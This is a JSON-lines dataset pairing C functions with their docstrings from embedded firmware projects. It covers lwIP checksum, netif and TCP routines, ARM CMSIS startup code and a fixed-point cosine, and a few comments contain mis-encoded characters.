{"docstring": "/**\n * Calculate a checksum over a chain of pbufs (without pseudo-header, much like\n * inet_chksum only pbufs are used).\n *\n * @param p pbuf chain over that the checksum should be calculated\n * @return checksum (as u16_t) to be saved directly in the protocol header\n */\n", "func_signal": "u16_t\ninet_chksum_pbuf(struct pbuf *p)", "code": "{\n  u32_t acc;\n  struct pbuf *q;\n  u8_t swapped;\n\n  acc = 0;\n  swapped = 0;\n  for(q = p; q != NULL; q = q->next) {\n    acc += LWIP_CHKSUM(q->payload, q->len);\n    acc = FOLD_U32T(acc);\n    if (q->len % 2 != 0) {\n      swapped = 1 - swapped;\n      acc = SWAP_BYTES_IN_WORD(acc);\n    }\n  }\n\n  if (swapped) {\n    acc = SWAP_BYTES_IN_WORD(acc);\n  }\n  return (u16_t)~(acc & 0xffffUL);\n}", "path": "Libraries\\Lwip\\lwip\\src\\core\\ipv4\\inet_chksum.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/* Alternative version #3 */\n/**\n * An optimized checksum routine. Basically, it uses loop-unrolling on\n * the checksum loop, treating the head and tail bytes specially, whereas\n * the inner loop acts on 8 bytes at a time. \n *\n * @arg start of buffer to be checksummed. May be an odd byte address.\n * @len number of bytes in the buffer to be checksummed.\n * @return host order (!) lwip checksum (non-inverted Internet sum) \n * \n * by Curt McDowell, Broadcom Corp. December 8th, 2005\n */\n", "func_signal": "static u16_t\nlwip_standard_chksum(void *dataptr, int len)", "code": "{\n  u8_t *pb = (u8_t *)dataptr;\n  u16_t *ps, t = 0;\n  u32_t *pl;\n  u32_t sum = 0, tmp;\n  /* starts at odd byte address? */\n  int odd = ((mem_ptr_t)pb & 1);\n\n  if (odd && len > 0) {\n    ((u8_t *)&t)[1] = *pb++;\n    len--;\n  }\n\n  ps = (u16_t *)pb;\n\n  if (((mem_ptr_t)ps & 3) && len > 1) {\n    sum += *ps++;\n    len -= 2;\n  }\n\n  pl = (u32_t *)ps;\n\n  while (len > 7)  {\n    tmp = sum + *pl++;          /* ping */\n    if (tmp < sum) {\n      tmp++;                    /* add back carry */\n    }\n\n    sum = tmp + *pl++;          /* pong */\n    if (sum < tmp) {\n      sum++;                    /* add back carry */\n    }\n\n    len -= 8;\n  }\n\n  /* make room in upper bits */\n  sum = FOLD_U32T(sum);\n\n  ps = (u16_t *)pl;\n\n  /* 16-bit aligned word remaining? */\n  while (len > 1) {\n    sum += *ps++;\n    len -= 2;\n  }\n\n  /* dangling tail byte remaining? */\n  if (len > 0) {                /* include odd byte */\n    ((u8_t *)&t)[0] = *(u8_t *)ps;\n  }\n\n  sum += t;                     /* add end bytes */\n\n  /* Fold 32-bit sum to 16 bits\n     calling this twice is propably faster than if statements... */\n  sum = FOLD_U32T(sum);\n  sum = FOLD_U32T(sum);\n\n  if (odd) {\n    sum = SWAP_BYTES_IN_WORD(sum);\n  }\n\n  return (u16_t)sum;\n}", "path": "Libraries\\Lwip\\lwip\\src\\core\\ipv4\\inet_chksum.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/**\n * \\brief This is the code that gets called on processor reset.\n * To initialize the device, and call the main() routine.\n */\n", "func_signal": "void Reset_Handler(void)", "code": "{\n\tuint32_t *pSrc, *pDest;\n\n\t/* Initialize the relocate segment */\n\tpSrc = &_etext;\n\tpDest = &_srelocate;\n\n\tif (pSrc != pDest) {\n\t\tfor (; pDest < &_erelocate;) {\n\t\t\t*pDest++ = *pSrc++;\n\t\t}\n\t}\n\n\t/* Clear the zero segment */\n\tfor (pDest = &_szero; pDest < &_ezero;) {\n\t\t*pDest++ = 0;\n\t}\n\n\t/* Set the vector table base address */\n\tpSrc = (uint32_t *) & _sfixed;\n\tSCB->VTOR = ((uint32_t) pSrc & SCB_VTOR_TBLOFF_Msk);\n\n\tif (((uint32_t) pSrc >= IRAM_ADDR) && ((uint32_t) pSrc < IRAM_ADDR + IRAM_SIZE)) {\n\t\tSCB->VTOR |= (1UL) << SCB_VTOR_TBLBASE_Pos;\n\t}\n\n\t/* Initialize the C library */\n\t__libc_init_array();\n\n\t/* Branch to main function */\n\tmain();\n\n\t/* Infinite loop */\n\twhile (1);\n}", "path": "Hardware\\duet\\sam\\system\\CMSIS\\Device\\ATMEL\\sam3sd8\\source\\as_gcc\\startup_sam3sd8.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/**\n * Call netif_set_addr() inside the tcpip_thread context.\n */\n", "func_signal": "void\ndo_netifapi_netif_set_addr(struct netifapi_msg_msg *msg)", "code": "{\n  netif_set_addr( msg->netif,\n                  msg->msg.add.ipaddr,\n                  msg->msg.add.netmask,\n                  msg->msg.add.gw);\n  msg->err = ERR_OK;\n  TCPIP_NETIFAPI_ACK(msg);\n}", "path": "Libraries\\Lwip\\lwip\\src\\api\\netifapi.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/**\n * call the \"errtfunc\" (or the \"voidfunc\" if \"errtfunc\" is NULL) in a thread-safe\n * way by running that function inside the tcpip_thread context.\n *\n * @note use only for functions where there is only \"netif\" parameter.\n */\n", "func_signal": "err_t\nnetifapi_netif_common(struct netif *netif, netifapi_void_fn voidfunc,\n                       netifapi_errt_fn errtfunc)", "code": "{\n  struct netifapi_msg msg;\n  msg.function = do_netifapi_netif_common;\n  msg.msg.netif = netif;\n  msg.msg.msg.common.voidfunc = voidfunc;\n  msg.msg.msg.common.errtfunc = errtfunc;\n  TCPIP_NETIFAPI(&msg);\n  return msg.msg.err;\n}", "path": "Libraries\\Lwip\\lwip\\src\\api\\netifapi.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/**  \n * @brief Fast approximation to the trigonometric cosine function for Q31 data.  \n * @param[in] x Scaled input value in radians.  \n * @return  cos(x).  \n *  \n * The Q31 input value is in the range [0 +1) and is mapped to a radian value in the range [0 2*pi).  \n */\n", "func_signal": "q31_t arm_cos_q31(\n  q31_t x)", "code": "{\n  q31_t cosVal, in, in2;                         /* Temporary variables for input, output */\n  q31_t wa, wb, wc, wd;                          /* Cubic interpolation coefficients */\n  q31_t a, b, c, d;                              /* Four nearest output values */\n  q31_t *tablePtr;                               /* Pointer to table */\n  q31_t fract, fractCube, fractSquare;           /* Temporary values for fractional values */\n  q31_t oneBy6 = 0x15555555;                     /* Fixed point value of 1/6 */\n  q31_t tableSpacing = TABLE_SPACING_Q31;        /* Table spacing */\n  q31_t temp;                                    /* Temporary variable for intermediate process */\n  uint32_t index;                                /* Index variable */\n\n  in = x;\n\n  /* Calculate the nearest index */\n  index = in / tableSpacing;\n\n  /* Calculate the nearest value of input */\n  in2 = ((q31_t) index) * tableSpacing;\n\n  /* Calculation of fractional value */\n  fract = (in - in2) << 8;\n\n  /* fractSquare = fract * fract */\n  fractSquare = ((q31_t) (((q63_t) fract * fract) >> 32));\n  fractSquare = fractSquare << 1;\n\n  /* fractCube = fract * fract * fract */\n  fractCube = ((q31_t) (((q63_t) fractSquare * fract) >> 32));\n  fractCube = fractCube << 1;\n\n  /* Initialise table pointer */\n  tablePtr = (q31_t *) & cosTableQ31[index];\n\n  /* Cubic interpolation process */\n  /* Calculation of wa */\n  /* wa = -(oneBy6)*fractCube + (fractSquare >> 1u) - (0x2AAAAAAA)*fract; */\n  wa = ((q31_t) (((q63_t) oneBy6 * fractCube) >> 32));\n  temp = 0x2AAAAAAA;\n  wa = (q31_t) ((((q63_t) wa << 32) + ((q63_t) temp * fract)) >> 32);\n  wa = -(wa << 1u);\n  wa += (fractSquare >> 1u);\n\n  /* Read first nearest value of output from the cos table */\n  a = *tablePtr++;\n\n  /* cosVal = a*wa */\n  cosVal = ((q31_t) (((q63_t) a * wa) >> 32));\n\n  /* q31(1.31) Fixed point value of 1 */\n  temp = 0x7FFFFFFF;\n\n  /* Calculation of wb */\n  wb = ((fractCube >> 1u) - (fractSquare + (fract >> 1u))) + temp;\n  /* Read second nearest value of output from the cos table */\n  b = *tablePtr++;\n\n  /*      cosVal += b*wb */\n  cosVal = (q31_t) ((((q63_t) cosVal << 32) + ((q63_t) b * (wb))) >> 32);\n\n  /* Calculation of wc */\n  wc = -fractCube + fractSquare;\n  wc = (wc >> 1u) + fract;\n  /* Read third nearest values of output value from the cos table */\n  c = *tablePtr++;\n\n  /*      cosVal += c*wc */\n  cosVal = (q31_t) ((((q63_t) cosVal << 32) + ((q63_t) c * (wc))) >> 32);\n\n  /* Calculation of wd */\n  /* wd = (oneBy6)*fractCube - (oneBy6)*fract; */\n  fractCube = fractCube - fract;\n  wd = ((q31_t) (((q63_t) oneBy6 * fractCube) >> 32));\n  wd = (wd << 1u);\n\n  /* Read fourth nearest value of output from the cos table */\n  d = *tablePtr++;\n\n  /* cosVal += d*wd; */\n  cosVal = (q31_t) ((((q63_t) cosVal << 32) + ((q63_t) d * (wd))) >> 32);\n\n  /* convert cosVal in 2.30 format to 1.31 format */\n  return (cosVal << 1u);\n\n}", "path": "Hardware\\duet\\sam\\system\\CMSIS\\CMSIS\\DSP_Lib\\Source\\FastMathFunctions\\arm_cos_q31.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/**\n * Call netif_add() inside the tcpip_thread context.\n */\n", "func_signal": "void\ndo_netifapi_netif_add(struct netifapi_msg_msg *msg)", "code": "{\n  if (!netif_add( msg->netif,\n                  msg->msg.add.ipaddr,\n                  msg->msg.add.netmask,\n                  msg->msg.add.gw,\n                  msg->msg.add.state,\n                  msg->msg.add.init,\n                  msg->msg.add.input)) {\n    msg->err = ERR_IF;\n  } else {\n    msg->err = ERR_OK;\n  }\n  TCPIP_NETIFAPI_ACK(msg);\n}", "path": "Libraries\\Lwip\\lwip\\src\\api\\netifapi.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/* inet_chksum_pseudo:\n *\n * Calculates the pseudo Internet checksum used by TCP and UDP for a pbuf chain.\n * IP addresses are expected to be in network byte order.\n *\n * @param p chain of pbufs over that a checksum should be calculated (ip data part)\n * @param src source ip address (used for checksum of pseudo header)\n * @param dst destination ip address (used for checksum of pseudo header)\n * @param proto ip protocol (used for checksum of pseudo header)\n * @param proto_len length of the ip data part (used for checksum of pseudo header)\n * @return checksum (as u16_t) to be saved directly in the protocol header\n */\n", "func_signal": "u16_t\ninet_chksum_pseudo(struct pbuf *p,\n       ip_addr_t *src, ip_addr_t *dest,\n       u8_t proto, u16_t proto_len)", "code": "{\n  u32_t acc;\n  u32_t addr;\n  struct pbuf *q;\n  u8_t swapped;\n\n  acc = 0;\n  swapped = 0;\n  /* iterate through all pbuf in chain */\n  for(q = p; q != NULL; q = q->next) {\n    LWIP_DEBUGF(INET_DEBUG, (\"inet_chksum_pseudo(): checksumming pbuf %p (has next %p) \\n\",\n      (void *)q, (void *)q->next));\n    acc += LWIP_CHKSUM(q->payload, q->len);\n    /*LWIP_DEBUGF(INET_DEBUG, (\"inet_chksum_pseudo(): unwrapped lwip_chksum()=%\"X32_F\" \\n\", acc));*/\n    /* just executing this next line is probably faster that the if statement needed\n       to check whether we really need to execute it, and does no harm */\n    acc = FOLD_U32T(acc);\n    if (q->len % 2 != 0) {\n      swapped = 1 - swapped;\n      acc = SWAP_BYTES_IN_WORD(acc);\n    }\n    /*LWIP_DEBUGF(INET_DEBUG, (\"inet_chksum_pseudo(): wrapped lwip_chksum()=%\"X32_F\" \\n\", acc));*/\n  }\n\n  if (swapped) {\n    acc = SWAP_BYTES_IN_WORD(acc);\n  }\n  addr = ip4_addr_get_u32(src);\n  acc += (addr & 0xffffUL);\n  acc += ((addr >> 16) & 0xffffUL);\n  addr = ip4_addr_get_u32(dest);\n  acc += (addr & 0xffffUL);\n  acc += ((addr >> 16) & 0xffffUL);\n  acc += (u32_t)htons((u16_t)proto);\n  acc += (u32_t)htons(proto_len);\n\n  /* Fold 32-bit sum to 16 bits\n     calling this twice is propably faster than if statements... */\n  acc = FOLD_U32T(acc);\n  acc = FOLD_U32T(acc);\n  LWIP_DEBUGF(INET_DEBUG, (\"inet_chksum_pseudo(): pbuf chain lwip_chksum()=%\"X32_F\"\\n\", acc));\n  return (u16_t)~(acc & 0xffffUL);\n}", "path": "Libraries\\Lwip\\lwip\\src\\core\\ipv4\\inet_chksum.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/**\n * Call the \"errtfunc\" (or the \"voidfunc\" if \"errtfunc\" is NULL) inside the\n * tcpip_thread context.\n */\n", "func_signal": "void\ndo_netifapi_netif_common(struct netifapi_msg_msg *msg)", "code": "{\n  if (msg->msg.common.errtfunc != NULL) {\n    msg->err = msg->msg.common.errtfunc(msg->netif);\n  } else {\n    msg->err = ERR_OK;\n    msg->msg.common.voidfunc(msg->netif);\n  }\n  TCPIP_NETIFAPI_ACK(msg);\n}", "path": "Libraries\\Lwip\\lwip\\src\\api\\netifapi.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/**\n * Call netif_set_addr() in a thread-safe way by running that function inside the\n * tcpip_thread context.\n *\n * @note for params @see netif_set_addr()\n */\n", "func_signal": "err_t\nnetifapi_netif_set_addr(struct netif *netif,\n                        ip_addr_t *ipaddr,\n                        ip_addr_t *netmask,\n                        ip_addr_t *gw)", "code": "{\n  struct netifapi_msg msg;\n  msg.function = do_netifapi_netif_set_addr;\n  msg.msg.netif = netif;\n  msg.msg.msg.add.ipaddr  = ipaddr;\n  msg.msg.msg.add.netmask = netmask;\n  msg.msg.msg.add.gw      = gw;\n  TCPIP_NETIFAPI(&msg);\n  return msg.msg.err;\n}", "path": "Libraries\\Lwip\\lwip\\src\\api\\netifapi.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/**\n * Initialize the system\n *\n * @param  none\n * @return none\n *\n * @brief  Setup the microcontroller system.\n *         Initialize the System.\n */\n", "func_signal": "void SystemInit (void)", "code": "{\n  SystemCoreClock = __SYSTEM_CLOCK;\n\n#ifdef __USE_GPIO\n  ARM_GPIO0->DATA[0].WORD = 0;\n  ARM_GPIO0->IE = 0;\n  ARM_GPIO0->DIR = 0xff83;\n  \n  ARM_GPIO1->DATA[0].WORD = 0;\n  ARM_GPIO1->IE = 0;\n  ARM_GPIO1->DIR = 0;\n  \n  ARM_GPIO2->DATA[0].WORD = 0;\n  ARM_GPIO2->IE = 0;\n  ARM_GPIO2->DIR = 0;\n#endif\n}", "path": "Hardware\\duet\\sam\\system\\CMSIS\\Device\\ARM\\ARMCM0\\Source\\Templates\\system_ARMCM0.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/* Alternative version #2 */\n/*\n * Curt McDowell\n * Broadcom Corp.\n * csm@broadcom.com\n *\n * IP checksum two bytes at a time with support for\n * unaligned buffer.\n * Works for len up to and including 0x20000.\n * by Curt McDowell, Broadcom Corp. 12/08/2005\n *\n * @param dataptr points to start of data to be summed at any boundary\n * @param len length of data to be summed\n * @return host order (!) lwip checksum (non-inverted Internet sum) \n */\n", "func_signal": "static u16_t\nlwip_standard_chksum(void *dataptr, int len)", "code": "{\n  u8_t *pb = (u8_t *)dataptr;\n  u16_t *ps, t = 0;\n  u32_t sum = 0;\n  int odd = ((mem_ptr_t)pb & 1);\n\n  /* Get aligned to u16_t */\n  if (odd && len > 0) {\n    ((u8_t *)&t)[1] = *pb++;\n    len--;\n  }\n\n  /* Add the bulk of the data */\n  ps = (u16_t *)(void *)pb;\n  while (len > 1) {\n    sum += *ps++;\n    len -= 2;\n  }\n\n  /* Consume left-over byte, if any */\n  if (len > 0) {\n    ((u8_t *)&t)[0] = *(u8_t *)ps;\n  }\n\n  /* Add end bytes */\n  sum += t;\n\n  /* Fold 32-bit sum to 16 bits\n     calling this twice is propably faster than if statements... */\n  sum = FOLD_U32T(sum);\n  sum = FOLD_U32T(sum);\n\n  /* Swap if alignment was odd */\n  if (odd) {\n    sum = SWAP_BYTES_IN_WORD(sum);\n  }\n\n  return (u16_t)sum;\n}", "path": "Libraries\\Lwip\\lwip\\src\\core\\ipv4\\inet_chksum.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/* Version #1 */\n/** Safe but slow: first call MEMCPY, then call LWIP_CHKSUM.\n * For architectures with big caches, data might still be in cache when\n * generating the checksum after copying.\n */\n", "func_signal": "u16_t\nlwip_chksum_copy(void *dst, const void *src, u16_t len)", "code": "{\n  MEMCPY(dst, src, len);\n  return LWIP_CHKSUM(dst, len);\n}", "path": "Libraries\\Lwip\\lwip\\src\\core\\ipv4\\inet_chksum.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/**\n * Initialize the system\n *\n * @param  none\n * @return none\n *\n * @brief  Setup the microcontroller system.\n *         Initialize the System.\n */\n", "func_signal": "void SystemInit (void)", "code": "{\n  #if (__FPU_PRESENT == 1) && (__FPU_USED == 1)\n    SCB->CPACR |= ((3UL << 10*2) |                 /* set CP10 Full Access */\n                   (3UL << 11*2)  );               /* set CP11 Full Access */\n  #endif\n\n  SystemCoreClock = __SYSTEM_CLOCK;\n\n#ifdef __USE_GPIO\n  ARM_GPIO0->DATA[0].WORD = 0;\n  ARM_GPIO0->IE = 0;\n  ARM_GPIO0->DIR = 0xff83;\n  \n  ARM_GPIO1->DATA[0].WORD = 0;\n  ARM_GPIO1->IE = 0;\n  ARM_GPIO1->DIR = 0;\n  \n  ARM_GPIO2->DATA[0].WORD = 0;\n  ARM_GPIO2->IE = 0;\n  ARM_GPIO2->DIR = 0;\n#endif\n}", "path": "Hardware\\duet\\sam\\system\\CMSIS\\CMSIS\\DSP_Lib\\Examples\\arm_linear_interp_example\\system_ARMCM4.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/* inet_chksum_pseudo:\n *\n * Calculates the pseudo Internet checksum used by TCP and UDP for a pbuf chain.\n * IP addresses are expected to be in network byte order.\n *\n * @param p chain of pbufs over that a checksum should be calculated (ip data part)\n * @param src source ip address (used for checksum of pseudo header)\n * @param dst destination ip address (used for checksum of pseudo header)\n * @param proto ip protocol (used for checksum of pseudo header)\n * @param proto_len length of the ip data part (used for checksum of pseudo header)\n * @return checksum (as u16_t) to be saved directly in the protocol header\n */\n", "func_signal": "u16_t\ninet_chksum_pseudo_partial(struct pbuf *p,\n       ip_addr_t *src, ip_addr_t *dest,\n       u8_t proto, u16_t proto_len, u16_t chksum_len)", "code": "{\n  u32_t acc;\n  u32_t addr;\n  struct pbuf *q;\n  u8_t swapped;\n  u16_t chklen;\n\n  acc = 0;\n  swapped = 0;\n  /* iterate through all pbuf in chain */\n  for(q = p; (q != NULL) && (chksum_len > 0); q = q->next) {\n    LWIP_DEBUGF(INET_DEBUG, (\"inet_chksum_pseudo(): checksumming pbuf %p (has next %p) \\n\",\n      (void *)q, (void *)q->next));\n    chklen = q->len;\n    if (chklen > chksum_len) {\n      chklen = chksum_len;\n    }\n    acc += LWIP_CHKSUM(q->payload, chklen);\n    chksum_len -= chklen;\n    LWIP_ASSERT(\"delete me\", chksum_len < 0x7fff);\n    /*LWIP_DEBUGF(INET_DEBUG, (\"inet_chksum_pseudo(): unwrapped lwip_chksum()=%\"X32_F\" \\n\", acc));*/\n    /* fold the upper bit down */\n    acc = FOLD_U32T(acc);\n    if (q->len % 2 != 0) {\n      swapped = 1 - swapped;\n      acc = SWAP_BYTES_IN_WORD(acc);\n    }\n    /*LWIP_DEBUGF(INET_DEBUG, (\"inet_chksum_pseudo(): wrapped lwip_chksum()=%\"X32_F\" \\n\", acc));*/\n  }\n\n  if (swapped) {\n    acc = SWAP_BYTES_IN_WORD(acc);\n  }\n  addr = ip4_addr_get_u32(src);\n  acc += (addr & 0xffffUL);\n  acc += ((addr >> 16) & 0xffffUL);\n  addr = ip4_addr_get_u32(dest);\n  acc += (addr & 0xffffUL);\n  acc += ((addr >> 16) & 0xffffUL);\n  acc += (u32_t)htons((u16_t)proto);\n  acc += (u32_t)htons(proto_len);\n\n  /* Fold 32-bit sum to 16 bits\n     calling this twice is propably faster than if statements... */\n  acc = FOLD_U32T(acc);\n  acc = FOLD_U32T(acc);\n  LWIP_DEBUGF(INET_DEBUG, (\"inet_chksum_pseudo(): pbuf chain lwip_chksum()=%\"X32_F\"\\n\", acc));\n  return (u16_t)~(acc & 0xffffUL);\n}", "path": "Libraries\\Lwip\\lwip\\src\\core\\ipv4\\inet_chksum.c", "repo_name": "reprappro/RepRapFirmware", "stars": 143, "license": "other", "language": "c", "size": 82235}
{"docstring": "/** \n * Update the state that tracks the available window space to advertise.\n *\n * Returns how much extra window would be advertised if we sent an\n * update now.\n */\n", "func_signal": "u32_t tcp_update_rcv_ann_wnd(struct tcp_pcb *pcb)", "code": "{\n  u32_t new_right_edge = pcb->rcv_nxt + pcb->rcv_wnd;\n\n  if (TCP_SEQ_GEQ(new_right_edge, pcb->rcv_ann_right_edge + LWIP_MIN((TCP_WND / 2), pcb->mss))) {\n    /* we can advertise more window */\n    pcb->rcv_ann_wnd = pcb->rcv_wnd;\n    return new_right_edge - pcb->rcv_ann_right_edge;\n  } else {\n    if (TCP_SEQ_GT(pcb->rcv_nxt, pcb->rcv_ann_right_edge)) {\n      /* Can happen due to other end sending out of advertised window,\n       * but within actual available (but not yet advertised) window */\n      pcb->rcv_ann_wnd = 0;\n    } else {\n      /* keep the right edge of window constant */\n      u32_t new_rcv_ann_wnd = pcb->rcv_ann_right_edge - pcb->rcv_nxt;\n      LWIP_ASSERT(\"new_rcv_ann_wnd <= 0xffff\", new_rcv_ann_wnd <= 0xffff);\n      pcb->rcv_ann_wnd = (u16_t)new_rcv_ann_wnd;\n    }\n    return 0;\n  }\n}", "path": "app\\sdklib\\lwip\\core\\tcp.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/**\n * Connects to another host. The function given as the \"connected\"\n * argument will be called when the connection has been established.\n *\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u04bb\ufffd\ufffdSYN\ufffd\ufffd\ufffd\u05b1\ufffd\ufffd\ufffd\n * @param pcb the tcp_pcb used to establish the connection \ufffd\ufffd\ufffd\ufffd\ufffd\u013f\ufffd\ufffd\u01bf\ufffd\ufffd\ufffd\ufffd\n * @param ipaddr the remote ip address to connect to \ufffd\ufffd\ufffd\ufffd\ufffd\ufffdIP\ufffd\ufffd\u05b7\n * @param port the remote tcp port to connect to \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02ff\u06ba\ufffd\n * @param connected callback function to call when connected (or on error)\n * @return ERR_VAL if invalid arguments are given\n *         ERR_OK if connect request has been sent\n *         other err_t values if connect request couldn't be sent\n */\n", "func_signal": "err_t\ntcp_connect(struct tcp_pcb *pcb, ip_addr_t *ipaddr, u16_t port,\n      tcp_connected_fn connected)", "code": "{\n  err_t ret;\n  u32_t iss;\n  u16_t old_local_port;\n\n  LWIP_ERROR(\"tcp_connect: can only connected from state CLOSED\", pcb->state == CLOSED, return ERR_ISCONN);\n\n  LWIP_DEBUGF(TCP_DEBUG, (\"tcp_connect to port %\"U16_F\"\\n\", port));\n  if (ipaddr != NULL) {\n    pcb->remote_ip = *ipaddr;//\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdIP\ufffd\ufffd\u05b7\ufffd\ufffd\u0427\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u04fc\ufffd\u00bc\ufffd\u043c\ufffd\u00bc\ufffd\ufffdIP\ufffd\ufffd\u05b7\ufffd\ufffd\ufffd\ufffd\ufffd\uda9f\udd7b\u0634\ufffd\ufffd\ufffd\n  } else {\n    return ERR_VAL;\n  }\n  pcb->remote_port = port;//\ufffd\ufffd\u00bc\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02ff\ufffd(\u013f\ufffd\u0136\u02ff\ufffd)\n\n  /* check if we have a route to the remote host */\n  if (ip_addr_isany(&(pcb->local_ip))) {\n    /* no local IP address set, yet. */\n    struct netif *netif = ip_route(&(pcb->remote_ip));\n    if (netif == NULL) {\n      /* Don't even try to send a SYN packet if we have no route\n         since that will fail. */\n      return ERR_RTE;\n    }\n    /* Use the netif's IP address as local address. */\n    ip_addr_copy(pcb->local_ip, netif->ip_addr);\n  }\n\n  old_local_port = pcb->local_port;\n  if (pcb->local_port == 0) {\n    pcb->local_port = tcp_new_port();\n\n  }\n#if SO_REUSE\n  if ((pcb->so_options & SOF_REUSEADDR) != 0) {\n    /* Since SOF_REUSEADDR allows reusing a local address, we have to make sure\n       now that the 5-tuple is unique. */\n    struct tcp_pcb *cpcb;\n    int i;\n    /* Don't check listen- and bound-PCBs, check active- and TIME-WAIT PCBs. */\n    for (i = 2; i < NUM_TCP_PCB_LISTS; i++) {\n      for(cpcb = *tcp_pcb_lists[i]; cpcb != NULL; cpcb = cpcb->next) {\n        if ((cpcb->local_port == pcb->local_port) &&\n            (cpcb->remote_port == port) &&\n            ip_addr_cmp(&cpcb->local_ip, &pcb->local_ip) &&\n            ip_addr_cmp(&cpcb->remote_ip, ipaddr)) {\n          /* linux returns EISCONN here, but ERR_USE should be OK for us */\n          return ERR_USE;\n        }\n      }\n    }\n  }\n#endif /* SO_REUSE */\n  iss = tcp_next_iss();//\ufffd\ufffd\u02bc\ufffd\ufffd\ufffd\ufffd\ufffd\n  pcb->rcv_nxt = 0;//\ufffd\ufffd\ufffd\u00f7\ufffd\ufffd\u0374\ufffd\ufffd\u06b5\u0138\ufffd\ufffd\ufffd\ufffd\u05b6\ufffd\n  pcb->snd_nxt = iss;\n  pcb->lastack = iss - 1;\n  pcb->snd_lbb = iss - 1;\n  pcb->rcv_wnd = TCP_WND;//\ufffd\ufffd\ufffd\ufffd\u012c\ufffd\u03fd\ufffd\ufffd\u0574\ufffd\ufffd\u06b8\ufffd\ufffd\ufffd\ufffd\u05b6\ufffd\u05b5\n  pcb->rcv_ann_wnd = TCP_WND;\n  pcb->rcv_ann_right_edge = pcb->rcv_nxt;\n  pcb->snd_wnd = TCP_WND;\n  /* As initial send MSS, we use TCP_MSS but limit it to 536.\n     The send MSS is updated when an MSS option is received. */\n  pcb->mss = (TCP_MSS > 536) ? 536 : TCP_MSS;//\ufffd\ufffd\u02bc\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0136\u03b4\ufffd\u0421\n#if TCP_CALCULATE_EFF_SEND_MSS\n  pcb->mss = tcp_eff_send_mss(pcb->mss, ipaddr);\n#endif /* TCP_CALCULATE_EFF_SEND_MSS */\n  pcb->cwnd = 1;//\ufffd\ufffd\u02bc\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\n  pcb->ssthresh = pcb->mss * 10;\n#if LWIP_CALLBACK_API\n  pcb->connected = connected;//\u05e2\ufffd\ufffdconnected\ufffd\u0635\ufffd\ufffd\ufffd\ufffd\ufffd\n#else /* LWIP_CALLBACK_API */  \n  LWIP_UNUSED_ARG(connected);\n#endif /* LWIP_CALLBACK_API */\n\n  /* Send a SYN together with the MSS option. */\n  ret = tcp_enqueue_flags(pcb, TCP_SYN);\n  if (ret == ERR_OK) {\n    /* SYN segment was enqueued, changed the pcbs state now \ufffd\ufffd\ufffd\u01bf\ufffd\ufffd\ufffd\ufffd\ufffd\u03aaSYN_SENT \u05f4\u032c*/\n    pcb->state = SYN_SENT;\n    if (old_local_port != 0) {\n      TCP_RMV(&tcp_bound_pcbs, pcb);\n    }\n    TCP_REG(&tcp_active_pcbs, pcb);\n    snmp_inc_tcpactiveopens();\n\n    tcp_output(pcb);//\ufffd\ufffd\ufffd\ufffd\ufffd\u01bf\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u04f5\u0131\ufffd\ufffd\u0137\ufffd\ufffd\u0373\ufffd\u0225\n  }\n  return ret;\n}", "path": "app\\sdklib\\lwip\\core\\tcp.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/**\n * Frees a TCP segment (tcp_seg structure).\n *\n * @param seg single tcp_seg to free\n */\n", "func_signal": "void\ntcp_seg_free(struct tcp_seg *seg)", "code": "{\n  if (seg != NULL) {\n    if (seg->p != NULL) {\n      pbuf_free(seg->p);\n#if TCP_DEBUG\n      seg->p = NULL;\n#endif /* TCP_DEBUG */\n    }\n    memp_free(MEMP_TCP_SEG, seg);\n  }\n}", "path": "app\\sdklib\\lwip\\core\\tcp.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/**\n * Deallocates a list of TCP segments (tcp_seg structures).\n *\n * @param seg tcp_seg list of TCP segments to free\n */\n", "func_signal": "void\ntcp_segs_free(struct tcp_seg *seg)", "code": "{\n  while (seg != NULL) {\n    struct tcp_seg *next = seg->next;\n    tcp_seg_free(seg);\n    seg = next;\n  }\n}", "path": "app\\sdklib\\lwip\\core\\tcp.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
